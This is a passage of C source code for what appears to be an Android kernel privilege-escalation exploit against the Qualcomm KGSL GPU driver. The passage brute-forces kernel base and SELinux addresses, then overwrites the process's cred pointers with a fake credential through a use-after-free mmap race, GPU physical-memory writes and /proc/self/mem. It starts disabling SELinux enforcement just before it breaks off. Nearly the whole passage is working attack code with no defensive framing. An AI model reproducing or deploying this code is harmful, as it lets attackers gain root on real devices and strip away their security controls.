        0x2F5FCE8,
        0x2F84CE8,
        0x2F64CE8,
        0x2F54CE8,
        0x2F44CE8,
        0x2F34CE8,
        0x2F24CE8,
        0x2F14CE8,
        0x2F04CE8,
        0x2EF4CE8,
    };

    for (size_t i = 0; i < sizeof(selinux_offsets) / sizeof(selinux_offsets[0]); i++)
    {
        uint64_t test_addr = kernel_base + selinux_offsets[i];
        uint8_t test_data[8];
        if (gpu_read_task_struct(fd, test_addr, test_data, 8) == 0)
        {
            uint64_t val = *(uint64_t *)test_data;
            if (val == 0 || val == 1)
                return selinux_offsets[i];
        }
    }

    return 0;
}

static uint64_t find_selinux_enforcing(void)
{
    uint64_t possible_bases[] = {
        0xffffffc000000000ULL,
        0xffffffc010000000ULL,
        0xffffffc020000000ULL,
        0xffffffc030000000ULL,
        0xffffffc040000000ULL,
        0xffffffc050000000ULL,
        0xffffffc060000000ULL,
        0xffffffc070000000ULL,
        0xffffffc080000000ULL,
        0xffffffc090000000ULL,
        0xffffffc0a0000000ULL,
    };

    uint64_t selinux_offsets[] = {
        0x2F74CE8,
        0x2A8FCE8,
        0x2B8FCE8,
        0x2F84CE8,
        0x2F64CE8,
        0x2F54CE8,
        0x2F44CE8,
        0x2F34CE8,
        0x2F24CE8,
        0x2F14CE8,
        0x2F04CE8,
        0x2EF4CE8,
    };

    fprintf(stderr, "[SELINUX] Searching for selinux_enforcing...\n");

    for (size_t b = 0; b < sizeof(possible_bases) / sizeof(possible_bases[0]); b++)
    {
        for (size_t o = 0; o < sizeof(selinux_offsets) / sizeof(selinux_offsets[0]); o++)
        {
            uint64_t test_addr = possible_bases[b] + selinux_offsets[o];
            uint8_t test_data[8];
            if (gpu_read_task_struct(fd, test_addr, test_data, 8) == 0)
            {
                uint64_t val = *(uint64_t *)test_data;
                if (val == 0 || val == 1)
                {
                    kernel_base = possible_bases[b];
                    selinux_enforcing = test_addr;
                    fprintf(stderr, "[SELINUX] Found at 0x%llx (base 0x%llx) value=%llu\n",
                            (unsigned long long)test_addr,
                            (unsigned long long)kernel_base,
                            (unsigned long long)val);
                    return test_addr;
                }
            }
        }
    }

    FILE *fp = fopen("/proc/self/maps", "r");
    if (fp)
    {
        char line[512];
        while (fgets(line, sizeof(line), fp))
        {
            if (strstr(line, "ffffffff") != NULL)
            {
                uint64_t addr = 0;
                if (sscanf(line, "%llx-", &addr) == 1)
                {
                    uint64_t base = addr & 0xffffffff00000000ULL;
                    if (base != 0)
                    {
                        uint64_t test_addr = base + 0x2F74CE8;
                        uint8_t test_data[8];
                        if (gpu_read_task_struct(fd, test_addr, test_data, 8) == 0)
                        {
                            uint64_t val = *(uint64_t *)test_data;
                            if (val == 0 || val == 1)
                            {
                                kernel_base = base;
                                selinux_enforcing = test_addr;
                                fprintf(stderr, "[SELINUX] Found via maps at 0x%llx\n", (unsigned long long)test_addr);
                                fclose(fp);
                                return test_addr;
                            }
                        }
                    }
                }
            }
        }
        fclose(fp);
    }

    return 0;
}

static int find_marker_in_page(uint8_t *page_data, size_t page_size, uint64_t current_va, pid_t *out_pid)
{
    const char *marker = "KETO0422";
    size_t marker_len = 8;

    for (int off = 0; off < (int)page_size - (int)marker_len - 5; off++)
    {
        if (memcmp(page_data + off, marker, marker_len) == 0)
        {
            char pid_str[6] = {0};
            memcpy(pid_str, page_data + off + marker_len, 5);

            int is_digit = 1;
            for (int i = 0; i < 5; i++)
            {
                if (pid_str[i] < '0' || pid_str[i] > '9')
                {
                    is_digit = 0;
                    break;
                }
            }

            if (is_digit)
            {
                pid_t pid = atoi(pid_str);
                if (pid > 1000 && pid < 100000)
                {
                    *out_pid = pid;
                    fprintf(stderr, "[MARKER] Found at VA 0x%llx offset 0x%03x: PID=%d\n",
                            (unsigned long long)current_va, off, pid);
                    return 1;
                }
            }
        }
    }
    return 0;
}

static int find_cred_pointers(uint8_t *task_data, size_t size,
                              uint64_t *cred_offset, uint64_t *real_cred_offset,
                              uint64_t *cred_ptr, uint64_t *real_cred_ptr)
{
    uint64_t offsets[] = {
        0x5a0, 0x5a8, 0x5b0, 0x598, 0x590, 0x5b8, 0x5c0, 0x588,
        0x580, 0x578, 0x570, 0x568, 0x560, 0x558, 0x550, 0x548,
        0x540, 0x538, 0x530, 0x528, 0x520, 0x518, 0x510, 0x508,
        0x500, 0x4f8, 0x4f0, 0x4e8, 0x4e0, 0x4d8, 0x4d0, 0x4c8};

    for (size_t i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++)
    {
        if (offsets[i] + 16 > size)
            continue;

        uint64_t val1 = *(uint64_t *)(task_data + offsets[i]);
        uint64_t val2 = *(uint64_t *)(task_data + offsets[i] + 8);

        if (val1 == 0 || val2 == 0)
            continue;
        if (val1 == 0xffffffffffffffffULL || val2 == 0xffffffffffffffffULL)
            continue;
        if ((val1 & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
            continue;
        if ((val2 & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
            continue;

        uint64_t diff = val1 > val2 ? val1 - val2 : val2 - val1;
        if (diff > 0x10000)
            continue;

        *cred_offset = offsets[i];
        *real_cred_offset = offsets[i] + 8;
        *cred_ptr = val1;
        *real_cred_ptr = val2;

        fprintf(stderr, "[CRED] Found at offset 0x%lx: cred=0x%llx, real_cred=0x%llx\n",
                (unsigned long)offsets[i], (unsigned long long)val1, (unsigned long long)val2);
        return 1;
    }
    return 0;
}

// ================== ПОИСК KERNEL BASE ИЗ TASK_STRUCT ==================
static uint64_t find_kernel_base_from_task_struct(uint64_t task_va)
{
    uint8_t task_data[4096];
    int chunk_size = 256;
    int chunks = 4096 / chunk_size;

    fprintf(stderr, "[*] Reading task_struct at 0x%llx to find kernel base...\n", task_va);

    for (int chunk = 0; chunk < chunks; chunk++)
    {
        uint64_t offset = chunk * chunk_size;
        if (gpu_read_task_struct(fd, task_va + offset, task_data + offset, chunk_size) != 0)
        {
            fprintf(stderr, "[!] Failed to read task_struct chunk %d\n", chunk);
            return 0;
        }
    }

    uint64_t kernel_pointers[] = {
        0x2b8, 0x2c0, 0x2c8, 0x2d0, 0x2d8, 0x2e0, 0x2e8, 0x2f0,
        0x2f8, 0x300, 0x308, 0x310, 0x318, 0x320, 0x328, 0x330,
        0x338, 0x340, 0x348, 0x350, 0x358, 0x360, 0x368, 0x370,
        0x5a0, 0x5a8, 0x5b0, 0x5b8, 0x5c0, 0x5c8, 0x5d0, 0x5d8,
        0x5e0, 0x5e8, 0x5f0, 0x5f8, 0x600, 0x608, 0x610, 0x618};

    uint64_t found_base = 0;

    for (int i = 0; i < sizeof(kernel_pointers) / sizeof(kernel_pointers[0]); i++)
    {
        uint64_t offset = kernel_pointers[i];
        if (offset + 8 > sizeof(task_data))
            continue;

        uint64_t ptr = *(uint64_t *)(task_data + offset);
        if (ptr == 0 || ptr == 0xffffffffffffffff)
            continue;

        if ((ptr & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
        {
            uint64_t possible_base = ptr & 0xFFFFFFFFFFFFF000ULL;
            uint64_t bases_to_try[] = {
                possible_base & 0xFFFFFFFF00000000ULL,
                (possible_base & 0xFFFFFFFF00000000ULL) - 0x100000000ULL,
                (possible_base & 0xFFFFFFFF00000000ULL) + 0x100000000ULL,
                possible_base & 0xFFFFFFFFFF000000ULL,
            };

            for (int b = 0; b < sizeof(bases_to_try) / sizeof(bases_to_try[0]); b++)
            {
                uint64_t test_base = bases_to_try[b];
                if (test_base == 0)
                    continue;

                uint64_t test_selinux = test_base + 0x2F74CE8;
                uint8_t test_data[8];
                if (gpu_read_task_struct(fd, test_selinux, test_data, 8) == 0)
                {
                    uint64_t val = *(uint64_t *)test_data;
                    if (val == 0 || val == 1)
                    {
                        found_base = test_base;
                        selinux_enforcing = test_selinux;
                        fprintf(stderr, "[+] Found kernel base from task_struct pointer: 0x%llx (ptr at offset 0x%llx = 0x%llx)\n",
                                found_base, offset, ptr);
                        fprintf(stderr, "[+] SELinux at: 0x%llx, value: 0x%llx\n", selinux_enforcing, val);
                        return found_base;
                    }
                }
            }
        }
    }
    return 0;
}

// ================== ПОЛУЧЕНИЕ KERNEL BASE ==================
static uint64_t get_kernel_base(void)
{
    uint64_t task_va = *(uint64_t *)&gbuf[0xb08];
    uint64_t base = 0;

    if (task_va != 0)
    {
        base = find_kernel_base_from_task_struct(task_va);
        if (base != 0)
            return base;
    }

    base = find_kernel_base_auto();
    if (base != 0)
    {
        kernel_base = base;
        return kernel_base;
    }

    uint64_t bases[] = {
        0xffffffc000000000ULL,
        0xffffffc010000000ULL,
        0xffffffc020000000ULL,
        0xffffffc030000000ULL,
        0xffffffc040000000ULL,
    };
    uint64_t selinux_offset = 0x2F74CE8;

    for (int i = 0; i < sizeof(bases) / sizeof(bases[0]); i++)
    {
        uint64_t test_base = bases[i];
        uint64_t test_selinux = test_base + selinux_offset;
        uint8_t test_data[8];
        if (gpu_read_task_struct(fd, test_selinux, test_data, 8) == 0)
        {
            uint64_t val = *(uint64_t *)test_data;
            if (val == 0 || val == 1)
            {
                kernel_base = test_base;
                selinux_enforcing = test_selinux;
                return kernel_base;
            }
        }
    }
    return 0;
}

// ================== ПОЛУЧЕНИЕ РЕАЛЬНОГО ФИЗИЧЕСКОГО АДРЕСА ЧЕРЕЗ PAGEMAP ==================
static uint64_t get_phys_addr_from_pagemap(uint64_t virt_addr)
{
    FILE *pagemap_fp = fopen("/proc/self/pagemap", "rb");
    if (!pagemap_fp)
    {
        fprintf(stderr, "[!] Failed to open /proc/self/pagemap: %s\n", strerror(errno));
        return 0;
    }

    // Pagemap entry size = 8 bytes
    // Entry = 64 bits, with PFN in bits 0-54 and flags in bits 55-63
    uint64_t pagemap_index = virt_addr / PAGE_SIZE;
    uint64_t pagemap_offset = pagemap_index * 8;

    fprintf(stderr, "[PAGEMAP] VA: 0x%llx, index: 0x%llx, offset: 0x%llx\n",
            virt_addr, pagemap_index, pagemap_offset);

    if (fseek(pagemap_fp, pagemap_offset, SEEK_SET) != 0)
    {
        fprintf(stderr, "[!] fseek failed: %s\n", strerror(errno));
        fclose(pagemap_fp);
        return 0;
    }

    uint64_t pagemap_entry = 0;
    if (fread(&pagemap_entry, 8, 1, pagemap_fp) != 1)
    {
        fprintf(stderr, "[!] fread failed: %s\n", strerror(errno));
        fclose(pagemap_fp);
        return 0;
    }

    fclose(pagemap_fp);

    // Extract PFN (Page Frame Number) from bits 0-54
    uint64_t pfn = pagemap_entry & 0x007FFFFFFFFFFFFFULL;
    uint64_t flags = (pagemap_entry >> 55) & 0x1FFULL;

    fprintf(stderr, "[PAGEMAP] Entry: 0x%llx, PFN: 0x%llx, flags: 0x%llx\n",
            pagemap_entry, pfn, flags);

    // Check if page is present (bit 63)
    if (!(pagemap_entry & (1ULL << 63)))
    {
        fprintf(stderr, "[!] Page not present in physical memory\n");
        return 0;
    }

    // Convert PFN to physical address
    uint64_t phys_addr = (pfn * PAGE_SIZE) + (virt_addr & (PAGE_SIZE - 1));
    fprintf(stderr, "[PAGEMAP] Calculated phys: 0x%llx\n", phys_addr);

    return phys_addr;
}

// ================== ЧТЕНИЕ ЧЕРЕЗ /DEV/MEM ==================
static int devmem_read(uint64_t phys_addr, uint8_t *buffer, size_t size)
{
    int devmem_fd = open("/dev/mem", O_RDONLY);
    if (devmem_fd < 0)
    {
        fprintf(stderr, "[DEVMEM] Failed to open /dev/mem: %s\n", strerror(errno));
        return -1;
    }

    fprintf(stderr, "[DEVMEM_READ] Reading %zu bytes from phys 0x%llx\n", size, phys_addr);

    if (lseek(devmem_fd, phys_addr, SEEK_SET) == -1)
    {
        fprintf(stderr, "[DEVMEM] lseek failed: %s\n", strerror(errno));
        close(devmem_fd);
        return -1;
    }

    ssize_t bytes_read = read(devmem_fd, buffer, size);
    close(devmem_fd);

    if (bytes_read != (ssize_t)size)
    {
        fprintf(stderr, "[DEVMEM] read failed: read %zd/%zu bytes, error: %s\n", bytes_read, size, strerror(errno));
        return -1;
    }

    fprintf(stderr, "[DEVMEM_READ] Successfully read %zu bytes\n", size);
    return 0;
}

// ================== ЗАПИСЬ ЧЕРЕЗ /DEV/MEM ==================
static int devmem_write(uint64_t phys_addr, const uint8_t *buffer, size_t size)
{
    int devmem_fd = open("/dev/mem", O_WRONLY);
    if (devmem_fd < 0)
    {
        fprintf(stderr, "[DEVMEM] Failed to open /dev/mem: %s\n", strerror(errno));
        return -1;
    }

    fprintf(stderr, "[DEVMEM_WRITE] Writing %zu bytes to phys 0x%llx\n", size, phys_addr);

    if (lseek(devmem_fd, phys_addr, SEEK_SET) == -1)
    {
        fprintf(stderr, "[DEVMEM] lseek failed: %s\n", strerror(errno));
        close(devmem_fd);
        return -1;
    }

    ssize_t bytes_written = write(devmem_fd, buffer, size);
    close(devmem_fd);

    if (bytes_written != (ssize_t)size)
    {
        fprintf(stderr, "[DEVMEM] write failed: wrote %zd/%zu bytes, error: %s\n", bytes_written, size, strerror(errno));
        return -1;
    }

    fprintf(stderr, "[DEVMEM_WRITE] Successfully wrote %zu bytes\n", size);
    return 0;
}

// ================== ПАТЧ CRED ЧЕРЕЗ UAF MMAP (ПРИОРИТЕТНЫЙ ПУТЬ) ==================
static int patch_cred_via_uaf_mmap(uint64_t task_va, uint64_t cred_offset, uint64_t real_cred_offset, uint64_t fake_cred)
{
    if (task_va < UAF_START || task_va >= UAF_START + UAF_SIZE || g_uaf_mmap_ptr == NULL)
    {
        fprintf(stderr, "[CHILD] [!] UAF mmap patch skipped: task_va=0x%llx, g_uaf_mmap_ptr=%p\n",
                task_va, g_uaf_mmap_ptr);
        return 0;
    }

    uint64_t offset = task_va - UAF_START;
    fprintf(stderr, "[CHILD] UAF mmap range: base=0x%llx task_va=0x%llx offset=0x%llx size=0x%llx\n",
            UAF_START, task_va, offset, UAF_SIZE);
    if (offset >= UAF_SIZE)
    {
        fprintf(stderr, "[CHILD] [!] UAF mmap patch skipped: task_va offset 0x%llx exceeds mapped range 0x%llx\n",
                offset, UAF_SIZE);
        return 0;
    }

    uint64_t *ptr_cred = (uint64_t *)((uint8_t *)g_uaf_mmap_ptr + offset + cred_offset);
    uint64_t *ptr_real_cred = (uint64_t *)((uint8_t *)g_uaf_mmap_ptr + offset + real_cred_offset);

    if ((uint8_t *)ptr_cred < (uint8_t *)g_uaf_mmap_ptr ||
        (uint8_t *)ptr_real_cred < (uint8_t *)g_uaf_mmap_ptr ||
        (uint8_t *)ptr_cred + 8 > (uint8_t *)g_uaf_mmap_ptr + g_uaf_mmapsize ||
        (uint8_t *)ptr_real_cred + 8 > (uint8_t *)g_uaf_mmap_ptr + g_uaf_mmapsize)
    {
        fprintf(stderr, "[CHILD] [!] UAF mmap patch skipped: target pointers out of range\n");
        return 0;
    }

    fprintf(stderr, "[CHILD] UAF mmap patch target offset=0x%llx cred_ptr=%p real_cred_ptr=%p\n",
            offset, (void *)ptr_cred, (void *)ptr_real_cred);

    uint64_t before_cred = *ptr_cred;
    uint64_t before_real_cred = *ptr_real_cred;
    fprintf(stderr, "[CHILD] UAF mmap BEFORE: cred=0x%llx real_cred=0x%llx target=0x%llx\n",
            before_cred, before_real_cred, fake_cred);

    for (int attempt = 0; attempt < 4; attempt++)
    {
        log_timing_window("UAF_WRITE", "CPU->L1/L2/L3/L4->DRAM", attempt, 500U + (unsigned int)attempt * 250U);
        fprintf(stderr, "[CHILD] UAF mmap TOCTOU attempt %d: write cred first\n", attempt);
        *ptr_cred = fake_cred;
        flush_icache(ptr_cred, 8);
        delay_timing_window(200U + (unsigned int)attempt * 300U);
        fprintf(stderr, "[CHILD] UAF mmap TOCTOU attempt %d: write real_cred second\n", attempt);
        *ptr_real_cred = fake_cred;
        flush_icache(ptr_real_cred, 8);

        fprintf(stderr, "[CHILD] UAF mmap WRITE attempt %d: cred written, real_cred written\n", attempt);

        msync(g_uaf_mmap_ptr, g_uaf_mmapsize, MS_SYNC | MS_INVALIDATE);
        __sync_synchronize();

        uint8_t verify_data[16] = {0};
        if (gpu_read_task_struct(fd, task_va + cred_offset, verify_data, 16) == 0)
        {
            uint64_t new_cred = *(uint64_t *)verify_data;
            uint64_t new_real_cred = *(uint64_t *)(verify_data + 8);
            fprintf(stderr, "[CHILD] UAF mmap verify attempt %d: cred=0x%llx real_cred=0x%llx (exp 0x%llx)\n",
                    attempt, new_cred, new_real_cred, fake_cred);
            fprintf(stderr, "[CHILD] UAF mmap direct mem attempt %d: cred=0x%llx real_cred=0x%llx\n",
                    attempt, *ptr_cred, *ptr_real_cred);
            if (new_cred == fake_cred && new_real_cred == fake_cred)
            {
                fprintf(stderr, "[CHILD] [+] UAF mmap cred patch SUCCESS on attempt %d!\n", attempt);
                return 1;
            }
        }

        if (attempt < 2)
            delay_timing_window(2000U + (unsigned int)attempt * 1000U);
    }

    fprintf(stderr, "[CHILD] [!] UAF mmap patch not verified\n");
    return 0;
}

// ================== ПРЯМОЙ ПАТЧ CRED ЧЕРЕЗ GPU С ПРОВЕРКОЙ ПО ФИЗИЧЕСКОМУ АДРЕСУ ==================
static int patch_cred_gpu_with_phys_verify(uint64_t task_va, uint64_t cred_offset, uint64_t real_cred_offset, uint64_t fake_cred)
{
    // ПОЛУЧАЕМ РЕАЛЬНЫЙ ФИЗИЧЕСКИЙ АДРЕС ЧЕРЕЗ PAGEMAP
    uint64_t task_phys = get_phys_addr_from_pagemap(task_va);
    if (task_phys == 0)
    {
        fprintf(stderr, "[CHILD] [!] Failed to get physical address for task_va\n");
        return 0;
    }

    uint64_t cred_phys = task_phys + cred_offset;
    uint64_t real_cred_phys = task_phys + real_cred_offset;

    fprintf(stderr, "[CHILD] GPU patching cred at phys: 0x%llx\n", cred_phys);
    fprintf(stderr, "[CHILD] task_va: 0x%llx, task_phys: 0x%llx\n", task_va, task_phys);

    // Пишем через GPU по физическому адресу
    int ret1 = gpu_write_phys_64(fd, cred_phys, fake_cred);
    int ret2 = gpu_write_phys_64(fd, real_cred_phys, fake_cred);

    fprintf(stderr, "[CHILD] GPU write results: cred=%d, real_cred=%d\n", ret1, ret2);

    if (ret1 != 0 || ret2 != 0)
    {
        fprintf(stderr, "[CHILD] [!] GPU write failed\n");
        return 0;
    }

    __sync_synchronize();

    // Проверяем ЧЕРЕЗ ТОТ ЖЕ ФИЗИЧЕСКИЙ АДРЕС!
    fprintf(stderr, "[CHILD] Verifying via PHYSICAL address 0x%llx through GPU...\n", cred_phys);
    for (int attempt = 0; attempt < 10; attempt++)
    {
        usleep(1000 * (attempt + 1));

        uint8_t phys_data[16];
        if (gpu_read_phys(fd, cred_phys, phys_data, 16) == 0)
        {
            uint64_t new_cred = *(uint64_t *)phys_data;
            uint64_t new_real_cred = *(uint64_t *)(phys_data + 8);
            fprintf(stderr, "[CHILD] Attempt %d (GPU): PHYS cred=0x%llx (exp 0x%llx), PHYS real_cred=0x%llx (exp 0x%llx)\n",
                    attempt, new_cred, fake_cred, new_real_cred, fake_cred);
            if (new_cred == fake_cred && new_real_cred == fake_cred)
            {
                fprintf(stderr, "[CHILD] [+] GPU phys cred patch SUCCESS on attempt %d!\n", attempt);
                return 1;
            }
        }
        else
        {
            fprintf(stderr, "[CHILD] Attempt %d: GPU phys read failed\n", attempt);
        }
    }

    // Если GPU не показал результат, проверяем через /dev/mem
    fprintf(stderr, "[CHILD] GPU verification failed, trying /dev/mem verification...\n");
    for (int attempt = 0; attempt < 5; attempt++)
    {
        usleep(1000 * (attempt + 1));

        uint8_t devmem_data[16];
        if (devmem_read(cred_phys, devmem_data, 16) == 0)
        {
            uint64_t new_cred = *(uint64_t *)devmem_data;
            uint64_t new_real_cred = *(uint64_t *)(devmem_data + 8);
            fprintf(stderr, "[CHILD] Attempt %d (/dev/mem): PHYS cred=0x%llx (exp 0x%llx), PHYS real_cred=0x%llx (exp 0x%llx)\n",
                    attempt, new_cred, fake_cred, new_real_cred, fake_cred);
            if (new_cred == fake_cred && new_real_cred == fake_cred)
            {
                fprintf(stderr, "[CHILD] [+] /dev/mem cred patch verified SUCCESS on attempt %d!\n", attempt);
                return 1;
            }
        }
        else
        {
            fprintf(stderr, "[CHILD] Attempt %d: /dev/mem read failed\n", attempt);
        }
    }

    fprintf(stderr, "[CHILD] [!] GPU phys cred patch FAILED - not verified by either GPU or /dev/mem\n");
    return 0;
}

// ================== ПАТЧ CRED ЧЕРЕЗ /PROC/SELF/MEM ==================
static int patch_cred_proc_mem(uint64_t task_va, uint64_t cred_offset, uint64_t real_cred_offset, uint64_t fake_cred)
{
    int mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd < 0)
    {
        fprintf(stderr, "[CHILD] /proc/self/mem open failed: %s\n", strerror(errno));
        return 0;
    }

    // Получаем реальный физический адрес для логирования
    uint64_t cred_va = task_va + cred_offset;
    uint64_t cred_phys = get_phys_addr_from_pagemap(cred_va);
    fprintf(stderr, "[CHILD] /proc/self/mem: cred_va=0x%llx, cred_phys=0x%llx\n", cred_va, cred_phys);

    fprintf(stderr, "[CHILD] /proc/self/mem opened, patching...\n");
    int ret = 0;

    for (int attempt = 0; attempt < 4; attempt++)
    {
        log_timing_window("PROC_MEM_WRITE", "CPU->L1/L2/L3/L4->DRAM", attempt, 1000U + (unsigned int)attempt * 250U);

        fprintf(stderr, "[CHILD] /proc/self/mem TOCTOU attempt %d: write cred first\n", attempt);
        lseek(mem_fd, cred_va, SEEK_SET);
        if (write(mem_fd, &fake_cred, 8) != 8)
        {
            fprintf(stderr, "[CHILD] cred write failed: %s\n", strerror(errno));
            goto close;
        }

        delay_timing_window(200U + (unsigned int)attempt * 400U);
        fprintf(stderr, "[CHILD] /proc/self/mem TOCTOU attempt %d: write real_cred second\n", attempt);
        lseek(mem_fd, task_va + real_cred_offset, SEEK_SET);
        if (write(mem_fd, &fake_cred, 8) != 8)
        {
            fprintf(stderr, "[CHILD] real_cred write failed: %s\n", strerror(errno));
            goto close;
        }

        __sync_synchronize();
        if (cred_phys != 0)
        {
            uint8_t verify_data[16];
            if (devmem_read(cred_phys, verify_data, 16) == 0)
            {
                uint64_t new_cred = *(uint64_t *)(verify_data);
                uint64_t new_real_cred = *(uint64_t *)(verify_data + 8);
                fprintf(stderr, "[CHILD] Attempt %d (/proc/self/mem): cred=0x%llx (exp 0x%llx), real_cred=0x%llx (exp 0x%llx)\n",
                        attempt, new_cred, fake_cred, new_real_cred, fake_cred);
                if (new_cred == fake_cred && new_real_cred == fake_cred)
                {
                    fprintf(stderr, "[CHILD] [+] /proc/self/mem cred patch SUCCESS on attempt %d!\n", attempt);
                    ret = 1;
                    goto close;
                }
            }
        }

        if (attempt < 2)
            delay_timing_window(1000U + (unsigned int)attempt * 1000U);
    }

    // Проверяем через /dev/mem если доступен
    if (cred_phys != 0)
    {
        uint8_t verify_data[16];
        if (devmem_read(cred_phys, verify_data, 16) == 0)
        {
            uint64_t new_cred = *(uint64_t *)(verify_data);
            uint64_t new_real_cred = *(uint64_t *)(verify_data + 8);
            fprintf(stderr, "[CHILD] After /proc/self/mem patch (via /dev/mem): cred=0x%llx (exp 0x%llx), real_cred=0x%llx (exp 0x%llx)\n",
                    new_cred, fake_cred, new_real_cred, fake_cred);
            if (new_cred == fake_cred && new_real_cred == fake_cred)
            {
                fprintf(stderr, "[CHILD] [+] /proc/self/mem cred patch SUCCESS (verified via /dev/mem)!\n");
                ret = 1;
            }
        }
        else
        {
            fprintf(stderr, "[CHILD] /dev/mem verification failed, trying GPU read\n");
            // Fallback to GPU read
            uint8_t gpu_verify[16];
            if (gpu_read_task_struct(fd, cred_va, gpu_verify, 16) == 0)
            {
                uint64_t new_cred = *(uint64_t *)(gpu_verify);
                uint64_t new_real_cred = *(uint64_t *)(gpu_verify + 8);
                fprintf(stderr, "[CHILD] After /proc/self/mem patch (via GPU): cred=0x%llx (exp 0x%llx), real_cred=0x%llx (exp 0x%llx)\n",
                        new_cred, fake_cred, new_real_cred, fake_cred);
                if (new_cred == fake_cred && new_real_cred == fake_cred)
                {
                    fprintf(stderr, "[CHILD] [+] /proc/self/mem cred patch SUCCESS (verified via GPU)!\n");
                    ret = 1;
                }
            }
        }
    }

close:
    close(mem_fd);
    return ret;
}

// ================== ПРОВЕРКА CRED ИЗ РАЗНЫХ ИСТОЧНИКОВ ==================
static int verify_cred_both_sources(uint64_t task_va, uint64_t cred_offset, uint64_t fake_cred, int *gpu_ok, int *cpu_ok)
{
    uint8_t gpu_data[16];
    uint8_t cpu_data[16];
    uint8_t devmem_data[16];
    *gpu_ok = 0;
    *cpu_ok = 0;

    uint64_t cred_va = task_va + cred_offset;
    uint64_t cred_phys = get_phys_addr_from_pagemap(cred_va);
    fprintf(stderr, "[VERIFY] cred_va=0x%llx, cred_phys=0x%llx\n", cred_va, cred_phys);

    // Через GPU (виртуальный)
    fprintf(stderr, "[VERIFY] Reading cred via GPU (virtual)...\n");
    if (gpu_read_task_struct(fd, cred_va, gpu_data, 16) == 0)
    {
        uint64_t gpu_val = *(uint64_t *)gpu_data;
        uint64_t gpu_real = *(uint64_t *)(gpu_data + 8);
        fprintf(stderr, "[VERIFY] GPU virt: cred=0x%llx, real_cred=0x%llx\n", gpu_val, gpu_real);
        if (gpu_val == fake_cred)
        {
            *gpu_ok = 1;
            fprintf(stderr, "[VERIFY] [+] GPU virt cred matches!\n");
        }
    }

    // Через /proc/self/mem (CPU)
    fprintf(stderr, "[VERIFY] Reading cred via CPU (/proc/self/mem)...\n");
    log_cpu_cache_path("VERIFY_CPU", "reading cred through /proc/self/mem");
    int mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd >= 0)
    {
        lseek(mem_fd, cred_va, SEEK_SET);
        if (read(mem_fd, cpu_data, 16) == 16)
        {
            uint64_t cpu_val = *(uint64_t *)cpu_data;
            uint64_t cpu_real = *(uint64_t *)(cpu_data + 8);
            fprintf(stderr, "[VERIFY] CPU: cred=0x%llx, real_cred=0x%llx\n", cpu_val, cpu_real);
            if (cpu_val == fake_cred)
            {
                *cpu_ok = 1;
                fprintf(stderr, "[VERIFY] [+] CPU cred matches!\n");
            }
        }
        close(mem_fd);
    }

    // Через /dev/mem (физический адрес)
    if (cred_phys != 0)
    {
        fprintf(stderr, "[VERIFY] Reading cred via /dev/mem (physical)...\n");
        if (devmem_read(cred_phys, devmem_data, 16) == 0)
        {
            uint64_t devmem_val = *(uint64_t *)devmem_data;
            uint64_t devmem_real = *(uint64_t *)(devmem_data + 8);
            fprintf(stderr, "[VERIFY] /dev/mem phys: cred=0x%llx, real_cred=0x%llx\n", devmem_val, devmem_real);
            if (devmem_val == fake_cred && *cpu_ok == 0)
            {
                *cpu_ok = 1;
                fprintf(stderr, "[VERIFY] [+] /dev/mem cred matches! (physical verify)\n");
            }
        }
        else
        {
            fprintf(stderr, "[VERIFY] /dev/mem read failed\n");
        }
    }

    if (*gpu_ok && *cpu_ok)
    {
        fprintf(stderr, "[VERIFY] [+++] BOTH GPU AND CPU CRED MATCH!\n");
        return 1;
    }
    return 0;
}

// ================== БЕЗОПАСНЫЙ ПАТЧ CRED ==================
static void safe_cred_patch(void)
{
    uint64_t task_va = *(uint64_t *)&gbuf[0xb08];
    uint8_t task_data[4096];
    int patched = 0;

    fprintf(stderr, "[CHILD] ============================================\n");
    fprintf(stderr, "[CHILD] Starting SAFE CRED PATCH\n");
    fprintf(stderr, "[CHILD] stage=enter | task_va=0x%llx | fd=%d\n", (unsigned long long)task_va, fd);
    fprintf(stderr, "[CHILD] task_va from gbuf[0xb08]: 0x%llx\n", (unsigned long long)task_va);
    fprintf(stderr, "[CHILD] g_uaf_mmap_ptr = %p\n", g_uaf_mmap_ptr);

    // Получаем физический адрес task_struct
    uint64_t task_phys = get_phys_addr_from_pagemap(task_va);
    fprintf(stderr, "[CHILD] task_phys: 0x%llx\n", task_phys);

    if (task_va == 0)
    {
        fprintf(stderr, "[CHILD] stage=fail | reason=task_va_missing\n");
        fprintf(stderr, "[CHILD] [!] No task_va in gbuf\n");
        gbuf[TASK_SPRAY_CLEAR] = 0x1;
        return;
    }

    if (fd < 0)
    {
        fprintf(stderr, "[CHILD] stage=fail | reason=fd_invalid | fd=%d\n", fd);
        fprintf(stderr, "[CHILD] [!] fd is invalid (%d), trying to reopen...\n", fd);
        fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
        if (fd < 0)
        {
            fprintf(stderr, "[CHILD] [!] Failed to reopen /dev/kgsl-3d0\n");
            gbuf[TASK_SPRAY_CLEAR] = 0x1;
            return;
        }
        fprintf(stderr, "[CHILD] [+] Reopened fd=%d\n", fd);
    }

    // ===== ШАГ 0: Получаем kernel base из task_struct =====
    if (kernel_base == 0)
    {
        kernel_base = find_kernel_base_from_task_struct(task_va);
        if (kernel_base == 0)
            kernel_base = get_kernel_base();
        fprintf(stderr, "[CHILD] Kernel base: 0x%llx\n", kernel_base);
    }

    // ===== ШАГ 1: ОТКЛЮЧАЕМ SELinux =====
    fprintf(stderr, "[CHILD] Step 1: Disabling SELinux via GPU write...\n");
    if (kernel_base != 0 && selinux_enforcing == 0)
    {
        uint64_t auto_offset = find_offsets_auto(kernel_base);
        selinux_enforcing = kernel_base + (auto_offset != 0 ? auto_offset : 0x2F74CE8);
    }

    if (kernel_base != 0 && selinux_enforcing != 0)
    {
        fprintf(stderr, "[CHILD] SELinux virt: 0x%llx kernel_base=0x%llx\n", selinux_enforcing, kernel_base);
        uint64_t selinux_phys = get_phys_addr_from_pagemap(selinux_enforcing);
        fprintf(stderr, "[CHILD] SELinux phys: 0x%llx\n", selinux_phys);
        if (selinux_phys != 0)
        {
            gpu_write_phys(fd, selinux_phys, 0);
            __sync_synchronize();
            fprintf(stderr, "[CHILD] SELinux disabled (attempted)\n");
        }
        else
        {
